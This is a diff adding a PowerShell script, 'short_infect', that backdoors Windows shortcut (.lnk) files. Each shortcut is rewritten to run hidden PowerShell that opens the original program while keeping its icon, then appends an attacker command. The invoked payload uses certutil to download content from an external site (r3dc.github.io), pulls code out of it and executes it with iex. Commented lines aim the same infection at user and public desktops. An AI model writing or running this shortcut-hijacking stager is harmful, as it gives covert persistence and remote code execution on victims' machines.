@@ -1,0 +1,49 @@
+function short_infect{ 
+    param($PathShortcut,$command)
+$StartMenu = Get-ChildItem $PathShortcut -Recurse -Include *.lnk;
+ForEach($ShortCut in $StartMenu)
+{
+    $sh = New-Object -ComObject WScript.Shell;
+    $lnk = $sh.CreateShortcut($ShortCut.FullName);
+    Write-Host "NameOfShortCut:>" $ShortCut;
+    Write-Host "TargetPath:>" $lnk.TargetPath;
+    Write-Host "Argument:>"$lnk.Arguments;
+    Write-Host "Icon:>"$lnk.IconLocation;
+    Write-Host "Demmarrage location:>"$lnk.WorkingDirectory;
+    $test_lenght=$lnk.TargetPath.Length + $lnk.Arguments.Length
+    if ($test_lenght -gt 68)
+    {
+        $test_lenght+= 191
+        write-host "TROP LONG: "$test_lenght "(259 requis)"
+    }
+    elseif ($lnk.TargetPath -eq "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"){
+        write-host "DEJA INFECTER"
+    }
+    else
+    {
+        $SourceFilePath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
+        $WScriptObj = New-Object -ComObject ("WScript.Shell");
+        $short = $WscriptObj.CreateShortcut($ShortCut); 
+        $short.TargetPath = $SourceFilePath;
+        $Argument = "Start `'"+ $lnk.TargetPath +"`' "+ $lnk.Arguments+";"+$command;
+        $short.Arguments = $Argument;
+        $short.WorkingDirectory = $lnk.WorkingDirectory;
+        $short.WindowStyle =7;
+        if($lnk.IconLocation -eq ",0")
+        {
+            $short.IconLocation = $lnk.TargetPath+" ,0";
+            Write-Host "(1)Icon:>"$short.IconLocation;
+        }else
+        {
+            $short.IconLocation = $lnk.IconLocation;
+            Write-Host "(2)Icon:>"$short.IconLocation;
+        };
+        $short.Save()
+        write-host "final commande shortcut: >>>>"$SourceFilePath $Argument
+    }
+}
+}
+short_infect -PathShortcut "C:\AdwCleaner" '$t=certutil -urlcache -f http://r3dc.github.io;$c='''';For($i=3;$i -lt $t.Count-1;$i++){$c += -join $t[$i][61..76]};iex $c'
+$desktop_path=env:USERPROFILE +  \Desktop
+#short_infect -PathShortcut $desktop_path '$t=certutil -urlcache -f http://r3dc.github.io;$c='''';For($i=3;$i -lt $t.Count-1;$i++){$c += -join $t[$i][61..76]};iex $c'
+#short_infect -PathShortcut "C:\Users\Public\Desktop" '$t=certutil -urlcache -f http://r3dc.github.io;$c='''';For($i=3;$i -lt $t.Count-1;$i++){$c += -join $t[$i][61..76]};iex $c'
